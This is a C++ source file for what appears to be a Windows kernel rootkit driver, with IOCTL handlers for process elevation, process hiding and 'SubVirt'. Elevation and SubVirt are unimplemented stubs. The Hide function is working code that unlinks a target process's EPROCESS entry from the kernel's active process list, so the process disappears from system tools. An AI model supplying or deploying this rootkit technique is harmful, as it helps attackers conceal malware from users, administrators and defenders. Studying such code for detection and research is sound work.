#include "ioctl_handles.h"
#include "utils.h"
#include "offsets.h"
#include "sync.h"
#include<ntstrsafe.h>
#include <ntstatus.h>
#include <ntddk.h>

static NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret);
static NTSTATUS Elevate(ULONG pid);
static NTSTATUS Hide(ULONG pid);
static NTSTATUS SubVirt();

//
// Calls process elevation function through IOCTL command.
//
NTSTATUS IoctlHandlers::HandleElevate(PIRP pIrp) {

	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid;

	DbgPrintEx(0, 0, "Recieved Elevate IOCTL...\n");
	//
	// Retrive PID.
	//
	status = GetIntFromIrp(pIrp, &pid);

	if (!NT_SUCCESS(status)) {
		pIrp->IoStatus.Information = 0;
		return 0;
	}

	KdPrint(("Retrived PID : %d\n", pid));

	status = Elevate(pid);

	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = status;

	return status;
}

//
// Calls process hide function through IOCTL command.
//
NTSTATUS IoctlHandlers::HandleHideProcess(PIRP pIrp) {

	NTSTATUS status = STATUS_SUCCESS;
	ULONG pid;

	DbgPrintEx(0, 0, "Recieved Hide IOCTL...\n");
	//
	// Retrive PID.
	//
	status = GetIntFromIrp(pIrp, &pid);

	if (!NT_SUCCESS(status)) {
		pIrp->IoStatus.Information = 0;
		return 0;
	}

	DbgPrintEx(0 , 0,"Retrived PID : %d\n", pid);

	status = Hide(pid);

	pIrp->IoStatus.Information = 0;
	pIrp->IoStatus.Status = status;

	return status;

}

//
// Function to test connection between usermode and kernel.
//
NTSTATUS IoctlHandlers::HandleTestConnection(PIRP pIrp, ULONG bufferSize) {

	NTSTATUS status = STATUS_SUCCESS;

	//
	// Get input and output from buffer.
	//
	char* inputbuffer = static_cast<char*>(pIrp->AssociatedIrp.SystemBuffer);
	char* outputbuffer = static_cast<char*>(pIrp->AssociatedIrp.SystemBuffer);
	//
	// Print output recieved from usermode.
	//
	DbgPrintEx(0, 0, "Input : %s\n", inputbuffer);

	char* outputprefix = "Hello from Kernel! Recieved Input : ";

	//
	// Check if the input buffersize is too small.
	//
	if (bufferSize < (strlen(inputbuffer) + strlen(outputprefix) + 1)) {

		DbgPrintEx(0, 0, "Output buffer too small...\n");
		status = STATUS_BUFFER_TOO_SMALL;
		pIrp->IoStatus.Information = 0;
	}

	else {

		char* readbuf = reinterpret_cast<char*>(ExAllocatePool2(POOL_FLAG_PAGED, 1024, 1));

		if (!readbuf) {
			DbgPrintEx(0, 0, "Buffer allocation failed...\n");
			status = STATUS_INSUFFICIENT_RESOURCES;
			pIrp->IoStatus.Information = 0;
			pIrp->IoStatus.Status = status;
			return status;
		}

		RtlZeroMemory(readbuf, 1024);
		//
		// Concatnate the strings to a new buffer.
		//
		RtlStringCbCatA(readbuf, bufferSize, outputprefix);
		RtlStringCbCatA(readbuf, bufferSize - strlen(outputprefix) - 1, inputbuffer);
		//
		// Copy buffer to original buffer.
		//
		RtlCopyMemory(outputbuffer, readbuf, strlen(readbuf) + 1);

		ExFreePool(readbuf);

		DbgPrintEx(0, 0, "Sending to user :%s\n", outputbuffer);
		status = STATUS_SUCCESS;
		pIrp->IoStatus.Information = strlen(outputbuffer) + 1;

	}

	pIrp->IoStatus.Status = status;
	return status;
}
//
// Calls subvirt function through IOCTL command.
// Yet to implement this function.
//
NTSTATUS IoctlHandlers::HandleSubvirt(PIRP pIrp) {

	NTSTATUS status = STATUS_SUCCESS;
	UNREFERENCED_PARAMETER(pIrp);
	KdPrint(("TODO!!!/n"));

	status = SubVirt();

	return status;

}

NTSTATUS GetIntFromIrp(PIRP pIrp, PULONG ret) {

	PCHAR pidbuf = static_cast<PCHAR>(pIrp->AssociatedIrp.SystemBuffer);

	KdPrint(("Getting PID...\n"));


	NTSTATUS status = RtlCharToInteger(pidbuf, 10, ret);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Sorry! Could not obtain PID from IRP...\n"));
		pIrp->IoStatus.Information = 0;
		return status;
	}

	if (!(*ret)) {
		status = STATUS_INVALID_PARAMETER;
		pIrp->IoStatus.Information = 0;
		return status;
	}

	return status;

}

NTSTATUS Elevate(ULONG pid) {

	UNREFERENCED_PARAMETER(pid);
	KdPrint(("TODO!!\n"));
	return STATUS_SUCCESS;

}

NTSTATUS Hide(ULONG pid) {

	PEPROCESS eproc;
	PLIST_ENTRY plist_active_procs;
	//
	// Gain thread exclusivity
	//

	PKDPC pkdpc = Sync::GainAllThreadExclusive();
	
	DbgPrintEx(0 , 0, "Finding EPROC struct with PID...\n");
	eproc = Utilities::FindProcEproc(pid);

	if (!eproc) {

		DbgPrintEx(0, 0, "! Error while retriving the eproc structure...\n");
		return STATUS_INVALID_PARAMETER;
	}
	
	plist_active_procs = (PLIST_ENTRY)((PUCHAR)eproc + FLINK_OFFSET);

	if (!plist_active_procs) {
		DbgPrintEx(0, 0, "Error: Invalid plist_active_procs pointer.\n");
		Sync::ReleaseAllThreadExclusive(pkdpc);
		return STATUS_INVALID_PARAMETER;
	}

	PLIST_ENTRY flink = plist_active_procs->Flink;
	PLIST_ENTRY blink = plist_active_procs->Blink;

	blink->Flink = flink;
	flink->Blink = blink;

	plist_active_procs->Flink = plist_active_procs;
	plist_active_procs->Blink = plist_active_procs;	

	Sync::ReleaseAllThreadExclusive(pkdpc);

	DbgPrintEx(0, 0, "Sucessfully Hid process...\n");
	return STATUS_SUCCESS;

}
NTSTATUS SubVirt() {
    KdPrint(("TODO!!\n"));
    return STATUS_SUCCESS;
}
